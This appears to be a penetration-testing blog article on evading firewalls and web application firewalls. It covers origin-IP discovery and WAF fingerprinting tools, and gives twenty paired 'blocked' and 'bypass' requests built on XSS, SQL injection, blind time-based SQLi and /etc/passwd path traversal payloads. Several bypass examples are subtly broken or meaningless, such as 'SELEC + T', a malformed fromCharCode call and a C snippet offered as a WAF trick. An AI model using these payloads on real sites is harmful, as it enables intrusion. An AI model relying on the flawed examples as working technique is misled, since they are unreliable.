---
title: "Firewall Evasion Techniques"
subtitle: "**Firewall Evasion Techniques: How to Evade WAF, Employ Tools Like NMAP, and Verify Bypass Methods for Optimized Network Security**"
tags: ["pentesting", "cybersecurity", "Firewalls"]
authors: ["blindma1den", "lorenagubaira"]

---

> Before reading this article, we recommend reading about [firewalls and how they work](/what-is-a-firewall-and-how-it-helps-optimize-network-security), we will be focusing on firewall evasion, but you need some fundamental firewall knowledge to understand evasion.

## What are we trying to evade against a firewall?

Most firewalls examine network packages with a series of filters (at the application or network level) as they attempt to enter the network. Then, depending on the source and destination IP addresses, protocols, and ports, the firewall decides whether they can enter, some **Web application firewalls (WAF)** also analyze the HTTP package payloads for malicious code, and others include antivirus, encrypted traffic inspection, and intrusion prevention systems (IPS).

# Evasion methods

Although **firewalls and IDSs** can prevent malicious packets from entering a network, an attacker can send modified packets to the target so that it can bypass the IDS/Firewall. These are ten methods of evasion:

1. **Encrypting data**: by encrypting the data being transmitted, it becomes more difficult for the firewall or intrusion detection system to detect any malicious activity.
2. **VPN**: a virtual private network (VPN) can help bypass firewalls and intrusion detection systems by routing traffic through a secure server.
3. **Proxy server**: A proxy server can help mask the origin of traffic, making it difficult for the firewall or intrusion detection system to trace the source of an attack.
4. **TOR**: The TOR network can help mask the user's identity and the origin of the traffic, making it difficult for the firewall or intrusion detection system to detect any malicious activity.
5. **Port hopping**: By constantly changing the port used to transmit data, it becomes more difficult for the firewall or intrusion detection system to detect any malicious activity.
6. **Steganography**: By hiding data within another file or message, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
7. **Application layer protocols**: By using application layer protocols such as HTTP or SMTP, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
8. **Malicious code:** When using malicious code or malware, it is more difficult for the firewall or intrusion detection system to detect any malicious activity.
9. **Social engineering**: By tricking users into divulging confidential information or performing certain actions, it is easier for an attacker to bypass the firewall or intrusion detection system.
10. **Physical access: By physically accessing the network or system, an attacker can bypass the firewall or intrusion detection system.
11. **Outdated software: Firewalls rely on software to function properly, and this software must be updated periodically to keep up with the latest threats. If you do not update your firewall software, you may become vulnerable to attacks discovered since the last update.
12. **Weak passwords:** A strong and unique password is one of the most important ways to protect your firewall against breaches. If you use a weak or easy-to-guess password, hackers can easily access your firewall and compromise your system.
13. **Insecure remote access:** If you allow remote access to your system, it is essential to protect this access with a strong password and two-factor authentication. If these measures are not taken, hackers can potentially gain access to your firewall through remote access.
14. **Incorrectly configured rules:** Firewalls rely on rules to determine what traffic is allowed and what is blocked. If these rules are not configured correctly, unwanted traffic may be allowed to pass through the firewall and compromise your system.

> To protect your firewall against breaches, it is essential to regularly update your software, use strong passwords, protect against malware infections, protect remote access, and configure your firewall rules correctly.

## Bypassing a firewall using SSL

There is a method to bypass network restrictions by encapsulating various types of traffic within an HTTPS connection on port 443. It involves setting up a reverse proxy server with an SSL certificate and using Stunnel to create an encrypted tunnel that masks SSH traffic as HTTPS. This approach allows users to circumvent firewalls that typically allow HTTPS traffic while blocking other types of traffic, effectively disguising non-web traffic as secure web browsing. The technique is particularly useful in less secure environments but may be less effective against advanced firewalls with SSL inspection capabilities.

> ðŸ”¥ Here is a detailed article on [how to bypass a firewall using SSL](#)

## Bypassing a firewall using NMAP Script Engine

The Nmap Scripting Engine (NSE) can be particularly effective for firewall bypass by using specific scripts designed to evade detection and penetrate restricted networks. These scripts can manipulate packet structures, employ decoy scans, or spoof IP addresses to trick firewalls into allowing traffic that would otherwise be blocked. NSE scripts can also help in identifying open ports that might be overlooked by firewalls or misconfigured security rules, providing a pathway to bypass network defenses. This makes NSE a powerful tool for testing and circumventing firewall restrictions during security assessments or penetration testing.

> ðŸ”¥ Here is a detailed article on how to [use the NMAP Script Engine to bypass a firewall](#).

## How to evade a WAF

### What to do to find the WAF provider and the real IP address?

Real IP Disclosure

1. RUN `shodan.io` or `censys.io`
2. Search for SPF records and TXT records.

SPF and TXT records can have an IP address of a non-CloudFlare point source.

3. You can also check securitytrails.com. The Historical data may have the original IP in the old records field.

**How to test that the WAF is configured correctly:**

- WAFs use standard ports 80, 443, 8000, 8008, 8080 and 8088.
- WAFs set their cookies on requests.
- WAFs are associated with separate headers.
- WAFs are exposed in the server header.
- WAFs are exposed in the response content.
- WAFs respond with unique response codes to malicious requests.
- Send a standard GET request from a browser, intercept, and log response headers (specific cookies).
- Send a request from the command line (e.g., cURL) and then verify the content and headers of the response.
- Send GET requests to random open ports and verify banners that may expose the identity of WAFs.
- Test some SQL injection payloads such as: or 1 = 1: to log into forms or forget a password.
- Try noisy XSS payloads like <script>confirm()</script> in some input fields.
- Try adding ../../../etc/passwd to a random parameter in the URL.
- Add some payloads like ' OR SLEEP(5) OR ' at the end of URLs to any random parameter.
- Send GET requests with deprecated protocols such as HTTP/0.9 (HTTP/0.9 does not support POST queries).
- Refer to the server header for different types of interactions.
- Send a raw FIN&RST packet to the server and identify a response.
- Side channel attacks: examine the temporal behavior of the request and response content.

## Tools to verify and bypass WAF

> w3af: web application attack and auditing framework

- **[wafw00f](https://github.com/EnableSecurity/wafw00f)**: Identify and fingerprint the web application firewall

- **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history):** bypass firewalls abusing DNS history. This tool will look for old DNS A records and check if the server is responding for that domain.

- **[CloudFail](https://github.com/m0rtem/CloudFail)**: is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.

## Techniques to bypass WAF:

Hereâ€™s a detailed explanation for each technique, including how to do it, a basic blocked request, and an updated request that may bypass the WAF:

### 1. URL Encoding Technique

**How to do it:**  
Encode special characters in the payload using URL encoding (percent-encoding) to bypass WAF detection.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with URL encoding:**
```bash
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

### 2. Unicode Technique

**How to do it:**  
Convert characters in the payload to their Unicode equivalents to evade detection.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with Unicode encoding:**
```bash
\u003Cscript\u003Ealert('XSS')\u003C/script\u003E
```

### 3. HTML Rendering Technique

**How to do it:**  
Use HTML entities to encode characters in the payload, which may render correctly in the browser but evade the WAF.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with HTML entities:**
```bash
&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

### 4. Mixed Encoding Technique

**How to do it:**  
Combine multiple encoding techniques (e.g., URL encoding and HTML entities) in a single payload to confuse the WAF.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with mixed encoding:**
```bash
%3Cscript%3Ealert%28%26%2339%3BXSS%26%2339%3B%29%3C%2Fscript%3E
```

### 5. Case Manipulation

**How to do it:**  
Combine uppercase and lowercase characters to create efficient payloads.

**Blocked original request:**
```bash
<script>confirm()</script>
```

**Updated with case-switching:**
```bash
<ScrIpT>confirm()</sCRiPt>
```

### 6. Bypassing Filters with Comments

**How to do it:**  
Insert comments or extraneous characters within the payload to break up the patterns the WAF is looking for.

**Blocked original request:**
```bash
SELECT * FROM users WHERE id=1;
```

**Updated with comments:**
```bash
SELECT/*comment*/ * FROM users WHERE id=1;
```

### 7. Parameter Pollution

**How to do it:**  
Send multiple parameters with the same name in a single request to confuse the WAF or web application.

**Blocked original request:**
```bash
GET /search?q=malicious_query
```

**Updated with parameter pollution:**
```bash
GET /search?q=benign_query&q=malicious_query
```

### 8. Path Traversal with Double Encoding

**How to do it:**  
Use double encoding to bypass WAF rules that only check for single-encoded sequences.

**Blocked original request:**
```bash
GET /../../etc/passwd
```

**Updated with double encoding:**
```bash
GET /%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 9. Customizing User-Agent or Referrer Headers

**How to do it:**  
Modify the User-Agent or Referrer header to bypass WAF rules that may apply different rules based on these headers.

**Blocked original request:**
```bash
GET /admin HTTP/1.1
User-Agent: NormalBrowser
```

**Updated with a custom User-Agent:**
```bash
GET /admin HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
```

### 10. Time-based SQL Injection (Blind SQL Injection)

**How to do it:**  
Use time delays in SQL injection to infer information from the database without directly retrieving data.

**Blocked original request:**
```bash
GET /search?q=' OR 1=1; --
```

**Updated with time-based SQL injection:**
```bash
GET /search?q='; IF (1=1) WAITFOR DELAY '00:00:05'; --
```

### 11. HTTP Parameter Tampering

**How to do it:**  
Modify parameters in HTTP requests, particularly POST requests, to bypass WAF rules focused on GET requests.

**Blocked original request:**
```bash
POST /login HTTP/1.1
username=admin&password=123456
```

**Updated with parameter tampering:**
```bash
POST /login HTTP/1.1
username=admin&password=wrong_password
```

### 12. Payload Fragmentation

**How to do it:**  
Split the payload across multiple requests or packets to avoid detection by the WAF.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with payload fragmentation:**
```bash
<script>aler
t('XSS')</script>
```

### 13. Testing and Logging Analysis

**How to do it:**  
Analyze WAF logs and responses to identify which payloads are being blocked and adjust accordingly.

**Blocked original request:**
```bash
GET /admin HTTP/1.1
```

**Updated based on log analysis:**
```bash
GET /admin.php HTTP/1.1
```

### 14. Wildcard Obfuscation

**How to do it:**  
Use wildcard characters in a way that confuses the WAF's pattern matching.

**Blocked original request:**
```bash
SELECT * FROM users WHERE username='admin';
```

**Updated with wildcard obfuscation:**
```bash
SELECT * FROM users WHERE username LIKE 'adm%';
```

### 15. Token Breaker Technique

**How to do it:**  
Insert characters or elements that break the tokens the WAF uses to identify malicious patterns.

**Blocked original request:**
```bash
SELECT * FROM users WHERE id=1;
```

**Updated with token breaking:**
```bash
SELEC + T * FROM users WHERE id=1;
```

### 16. Tabs and Line Feed Technique

**How to do it:**  
Insert tabs (`\t`) or line feeds (`\n`) within payloads to disrupt the pattern matching of the WAF.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with tabs and line feeds:**
```bash
<script>\n\talert('XSS')</script>
```

### 17. Uninitialized Variable Technique

**How to do it:**  
Use uninitialized or rarely used variables in the payload to confuse the WAFâ€™s detection algorithms.

**Blocked original request:**
```bash
int x = 1; return x;
```

**Updated with uninitialized variable:**
```bash
int x; return x = 1;
```

### 18. Newline Technique

**How to do it:**  
Introduce newline characters within a payload to break up malicious patterns the WAF is scanning for.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with newline characters:**
```bash
<script>
alert('XSS')
</script>
```

### 19. Junk Character Technique

**How to do it:**  
Insert random or irrelevant characters into the payload that the target application will ignore, but which might cause the WAF to overlook the attack.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with junk characters:**
```bash
<scri%00pt>alert('XSS')</scri%00pt>
```

### 20. Dynamic Payload Generation Technique

**How to do it:**  
Generate payloads dynamically, so they change on each request, making it difficult for the WAF to recognize and block them.

**Blocked original request:**
```bash
<script>alert('XSS')</script>
```

**Updated with dynamic payload generation:**
```bash
<script>eval(String.fromCharCode(97,108,101,114,116)('XSS'))</script>
```



